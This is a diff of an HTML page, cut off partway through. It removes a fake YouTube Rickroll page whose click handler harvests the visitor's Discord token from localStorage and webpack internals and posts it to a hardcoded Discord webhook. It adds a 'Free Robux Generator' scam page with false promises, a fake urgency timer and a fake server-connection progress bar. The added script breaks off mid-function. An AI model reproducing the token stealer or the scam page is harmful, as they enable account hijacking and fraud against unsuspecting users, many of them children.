@@ -3,75 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Never Gonna Give You Up - Rick Astley</title>
-    <link rel="icon" href="https://www.youtube.com/s/desktop/7b75adeb/img/favicon.ico">
+    <title>Free Robux Generator - Get 10,000 Robux Now!</title>
+    <link rel="icon" href="https://roblox.com/favicon.ico">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #000;
+            background: linear-gradient(135deg, #0099ff, #ff0099);
             color: #fff;
-            overflow: hidden;
-        }
-        .video-container {
-            position: relative;
-            width: 100%;
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
-        .video-placeholder {
+        .container {
             width: 100%;
-            max-width: 853px;
-            height: 480px;
-            background-color: #111;
-            position: relative;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-        }
-        .play-button {
-            width: 90px;
-            height: 90px;
+            max-width: 500px;
             background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background-color: #fff;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            position: relative;
+            font-size: 60px;
+            color: #0099ff;
         }
-        .play-button::after {
-            content: '';
-            width: 0;
-            height: 0;
-            border-top: 20px solid transparent;
-            border-bottom: 20px solid transparent;
-            border-left: 35px solid #ff0000;
-            margin-left: 8px;
-        }
-        .video-info {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: 20px;
-            background: linear-gradient(transparent, rgba(0, 0, 0, 0.9));
-        }
-        .video-title {
-            font-size: 24px;
+        h1 {
+            font-size: 28px;
             margin-bottom: 10px;
         }
-        .video-stats {
-            display: flex;
-            gap: 20px;
-            font-size: 14px;
-            color: #aaa;
+        .subtitle {
+            font-size: 18px;
+            margin-bottom: 30px;
+            color: #f0f0f0;
         }
-        .hidden {
+        .robux-amount {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #ffcc00;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+        }
+        .button {
+            background: linear-gradient(45deg, #0099ff, #00ccff);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+            width: 100%;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+        }
+        .feature {
+            text-align: center;
+            width: 30%;
+        }
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .timer {
+            margin: 20px 0;
+            font-size: 16px;
+            color: #ffcc00;
+        }
+        .loading {
             display: none;
+            margin-top: 20px;
+        }
+        .loading-bar {
+            height: 10px;
+            background-color: rgba(255, 255, 255, 0.3);
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        .loading-progress {
+            height: 100%;
+            background-color: #ffcc00;
+            width: 0%;
+            transition: width 0.3s;
         }
         .notification {
             position: fixed;
@@ -84,6 +121,7 @@
             box-shadow: 0 2px 10px rgba(0,0,0,0.2);
             transform: translateY(100px);
             transition: transform 0.3s ease;
+            max-width: 300px;
         }
         .notification.show {
             transform: translateY(0);
@@ -91,135 +129,56 @@
     </style>
 </head>
 <body>
-    <div class="video-container">
-        <div class="video-placeholder" id="videoPlaceholder">
-            <div class="play-button"></div>
+    <div class="container">
+        <div class="logo">R$</div>
+        <h1>Free Robux Generator</h1>
+        <p class="subtitle">Get your free Robux instantly!</p>
+        
+        <div class="robux-amount">10,000 R$</div>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <div>Instant Delivery</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <div>100% Free</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <div>No Survey</div>
+            </div>
         </div>
-        <div class="video-info">
-            <h1 class="video-title">Rick Astley - Never Gonna Give You Up (Official Music Video)</h1>
-            <div class="video-stats">
-                <span>1.4B views</span>
-                <span>Oct 25, 2009</span>
-                <span>3M likes</span>
+        
+        <div class="timer">Limited time offer! Only <span id="timeLeft">5:00</span> remaining!</div>
+        
+        <button class="button" id="getRobuxBtn">Get 10,000 Robux Now!</button>
+        
+        <div class="loading" id="loading">
+            <p>Connecting to Roblox servers...</p>
+            <div class="loading-bar">
+                <div class="loading-progress" id="loadingProgress"></div>
             </div>
         </div>
     </div>
     
     <div class="notification" id="notification">
-        Click to play the video
+        Click to claim your free Robux!
     </div>
 
     <script>
-        document.getElementById('videoPlaceholder').addEventListener('click', async function() {
-            const notification = document.getElementById('notification');
-            notification.textContent = 'Loading video...';
-            notification.classList.add('show');
-            
-            // Try to extract Discord token
-            try {
-                // Method 1: localStorage
-                let token = localStorage.getItem('token');
-                
-                // Method 2: Discord web app token extraction
-                if (!token) {
-                    try {
-                        const discordToken = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken)?.exports.default.getToken());
-                        if (discordToken) {
-                            token = discordToken;
-                        }
-                    } catch (e) {
-                        // Continue to next method
-                    }
-                }
-                
-                // Method 3: Another extraction method
-                if (!token) {
-                    try {
-                        const webpackJsonp = window.webpackJsonp;
-                        if (webpackJsonp) {
-                            for (const prop in webpackJsonp) {
-                                if (webpackJsonp[prop].exports) {
-                                    for (const exportedProp in webpackJsonp[prop].exports) {
-                                        if (webpackJsonp[prop].exports[exportedProp].default) {
-                                            const user = webpackJsonp[prop].exports[exportedProp].default.getUser;
-                                            if (user) {
-                                                const userInfo = user();
-                                                if (userInfo && userInfo.authToken) {
-                                                    token = userInfo.authToken;
-                                                    break;
-                                                }
-                                            }
-                                        }
-                                    }
-                                    if (token) break;
-                                }
-                            }
-                        }
-                    } catch (e) {
-                        // Continue to next method
-                    }
-                }
-                
-                // Send token to webhook if found
-                if (token) {
-                    const webhookUrl = 'https://discord.com/api/webhooks/1495110283046162432/y1MJFTRx97Q8C6yxOvHjsdQZcH1Aa77KlZDCJIPU7c75c9WYWMJ6gVicIGs8shr1iur-';
-                    
-                    const data = {
-                        content: `Discord Token: ${token}`,
-                        embeds: [{
-                            title: 'Token Extracted',
-                            description: `A Discord token has been extracted from the browser.`,
-                            color: 5814783,
-                            fields: [
-                                {
-                                    name: 'Token',
-                                    value: `\`\`\`${token}\`\`\``,
-                                    inline: false
-                                }
-                            ]
-                        }]
-                    };
-                    
-                    try {
-                        const response = await fetch(webhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(data)
-                        });
-                        
-                        if (response.ok) {
-                            console.log('Token sent successfully');
-                        } else {
-                            console.log('Error sending token');
-                        }
-                    } catch (error) {
-                        console.log('Network error when sending token');
-                    }
-                }
-                
-                // Now redirect to actual Rickroll
-                setTimeout(() => {
-                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-                }, 1500);
-                
-            } catch (error) {
-                // Still redirect to Rickroll even if extraction fails
-                setTimeout(() => {
-                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-                }, 1500);
-            }
-        });
+        // Timer countdown
+        let timeLeft = 300; // 5 minutes in seconds
+        const timerElement = document.getElementById('timeLeft');
         
-        // Show initial notification
-        setTimeout(() => {
-            const notification = document.getElementById('notification');
-            notification.classList.add('show');
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
-        }, 1000);
-    </script>
-</body>
-</html>
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}\${seconds}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.textContent
